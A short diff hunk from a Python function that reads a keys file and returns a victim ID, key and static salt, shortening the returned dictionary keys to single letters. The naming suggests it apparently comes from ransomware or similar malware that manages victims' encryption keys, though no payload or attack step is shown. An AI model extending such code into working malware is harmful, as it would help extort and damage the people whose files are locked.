@@ -23,7 +23,7 @@ def get():
     keysFile.close()
 
     return {
-        'id': victimId,
-        'key': victimKey,
-        'salt': staticSalt
+        'i': victimId,
+        'k': victimKey,
+        's': staticSalt
     }
